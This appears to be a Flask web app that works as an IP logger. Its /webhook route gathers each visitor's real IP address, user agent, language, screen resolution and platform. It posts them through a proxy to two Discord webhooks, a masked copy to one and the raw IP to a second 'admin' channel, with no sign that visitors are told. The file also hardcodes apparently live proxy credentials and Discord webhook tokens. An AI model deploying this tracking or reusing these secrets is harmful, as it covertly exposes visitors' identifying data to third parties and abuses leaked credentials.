import requests
import datetime
import os
import time
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# [프록시 설정]
PROXY_URL = "http://mkmp3kpf:pka5tdl4@p.tokenu.to:10001"
PROXIES = {"http": PROXY_URL, "https": PROXY_URL}

# [웹훅 주소] - 반드시 디스코드 설정에서 '서로 다른 채널'의 주소인지 확인하세요!
MASKED_CHANNEL_URL = "https://discord.com/api/webhooks/1477919339205361767/C8Lbp7KnEF7S63YJOKf1PVa2u-t0i2Z6uk-Zqus8L9-QfR7aj-NlGW3zfVd41sX_beTX"
RAW_CHANNEL_URL = "https://discordapp.com/api/webhooks/1477910235048968275/otX6RnzhUAWP3WJRe8A_wMAQ9hWyLPSoY3kIAhYC__CIr87A1bXqoRLyWpeHnTsRPA_v"

def get_masked_ip(ip):
    """IP 뒷자리를 xxx로 가려주는 함수"""
    try:
        parts = ip.split('.')
        return f"{parts[0]}.{parts[1]}.xxx.xxx" if len(parts) == 4 else ip
    except:
        return "Unknown"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/webhook', methods=['POST'])
def handle_webhook():
    try:
        client_data = request.json or {}
        x_forwarded = request.headers.get('X-Forwarded-For')
        raw_ip = x_forwarded.split(',')[0].strip() if x_forwarded else request.remote_addr
        
        # 1. 각각의 IP 변수 생성
        masked_ip = get_masked_ip(raw_ip) # 가려진 IP
        real_ip = raw_ip                  # 원본 IP
        
        user_agent = request.headers.get('User-Agent', 'Unknown')
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        headers = {"User-Agent": "Mozilla/5.0"}

        # 공통 정보 (해상도, 언어 등)
        common_fields = [
            {"name": "🌍 언어/지역", "value": f"`{client_data.get('language', 'N/A')}`", "inline": True},
            {"name": "🖥️ 해상도", "value": f"`{client_data.get('screen', 'N/A')}`", "inline": True},
            {"name": "⚙️ 플랫폼", "value": f"`{client_data.get('platform', 'N/A')}`", "inline": False},
            {"name": "🕵️ 기기 정보", "value": f"```{user_agent}```", "inline": False}
        ]

        # --- 전송 1: 일반 채널 (가려진 IP 전송) ---
        payload_masked = {
            "username": "일반 모니터링",
            "embeds": [{
                "title": "🌐 접속 알림 (IP 마스킹)",
                "color": 5763719, # 초록색
                "fields": [{"name": "📍 접속 IP (보안)", "value": f"`{masked_ip}`", "inline": False}] + common_fields,
                "footer": {"text": f"기록 시각: {timestamp}"}
            }]
        }
        res1 = requests.post(MASKED_CHANNEL_URL, json=payload_masked, headers=headers, proxies=PROXIES, timeout=10)
        print(f"Masked Send: {res1.status_code}")

        time.sleep(2) # 디스코드 차단 방지용 딜레이

        # --- 전송 2: 관리자 채널 (원본 IP 전송) ---
        payload_raw = {
            "username": "관리자 보안 로그",
            "embeds": [{
                "title": "🛡️ 상세 보안 로그 (원본 IP)",
                "color": 15548997, # 빨간색
                "fields": [{"name": "📍 실제 접속 IP", "value": f"`{real_ip}`", "inline": False}] + common_fields,
                "footer": {"text": f"기록 시각: {timestamp}"}
            }]
        }
        res2 = requests.post(RAW_CHANNEL_URL, json=payload_raw, headers=headers, proxies=PROXIES, timeout=10)
        print(f"Raw Send: {res2.status_code}")

    except Exception as e:
        print(f"에러 발생: {e}")

    return jsonify({"status": "success"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
